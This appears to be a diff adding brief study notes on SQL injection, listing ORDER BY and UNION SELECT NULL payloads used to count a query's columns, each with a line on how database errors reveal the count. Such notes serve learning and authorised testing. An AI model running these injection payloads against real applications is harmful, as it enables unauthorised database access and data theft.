@@ -1,0 +1,11 @@
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+
+when the specified column index exceeds the number of actual columns in the result set, the database returns an error
+
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+
+If the number of nulls does not match the number of columns, the database returns an error
